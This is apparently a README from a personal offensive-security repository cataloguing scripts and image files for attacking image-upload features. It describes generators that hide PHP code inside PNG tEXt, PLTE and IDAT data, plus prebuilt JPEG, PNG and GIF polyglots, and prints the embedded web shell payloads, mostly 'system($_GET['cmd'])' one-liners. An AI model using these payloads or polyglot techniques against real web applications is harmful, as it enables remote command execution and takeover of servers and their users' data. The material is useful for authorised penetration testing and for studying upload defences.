# Image Upload Payloads and Scripts

This directory contains my payloads and scripts related to image upload vulnerabilities.

## Scripts

- **generate_tEXtPNG.php**  
  Takes 3 parameters: a PNG image, a PHP payload, and an output name.  
  Creates a new PHP file with a valid PNG structure that embeds the payload inside a custom `tEXt` chunk called `"synackt"`.

- **generatePLTE.php**  
  Takes 2 parameters: a PHP payload and an output name.  
  Creates a new PHP file with a valid PNG structure that hides the payload inside its palette (`PLTE`) instructions.

- **generateIDAT.php**  
  Very specific script.  
  Produces a `110x110` PNG image that, once resized to `55x55`, contains the exact PHP payload:  
  ```php
  <?=$_GET[0]($_POST[1]);?>

## Payloads

- **magicAd1Pixel.jpg**  
  A one-pixel JPEG image. With payload.  
  It contains the following PHP payload inside:
  
  ```php
  <?php echo system($_GET['cmd']); ?>

- **magicOnly.jpg**
  A minimal, magic-byte only JPEG image. With payload.
  It contains the following PHP payload inside:
  
  ```php
  <?php echo system($\_GET\['cmd']); ?>
  
- **PLTE1.png**
  A simple PNG image  with the payload in its PLTE section
  Generated by the PLTE script above.
  The image has an IHDR, PLTE, IDAT, and an IEND
  It contains the following PHP payload inside:
  
  ```php
  <?php echo shell_exec($\_GET\['cmd']); ?>


- **commentAnd1Pixel.png**
  A one-pixel PNG image with the payload in its comment section
  Comment was added using exiftool
  The image has an IHDR, tEXtComment, IDAT, and an IEND
  It contains the following PHP payload inside:
  
  ```php
  <?php echo system($_GET['cmd']); ?>  
  
  
  
- **realAndEnd.gif**
  A simple real GIF with the payload appended to its end
  - This wasn't tested and may not work due to unpredictable data before actual php code
  It contains the following PHP payload inside:
  
  ```php
  <?php echo system($_GET['cmd']); ?> 
  
  
 - **minimal89.gif**
   A GIF consisting of only the GIF89a + payload
   It contains the following PHP payload inside:

    ```php
    <?php echo system($_GET['cmd']); ?> 
  
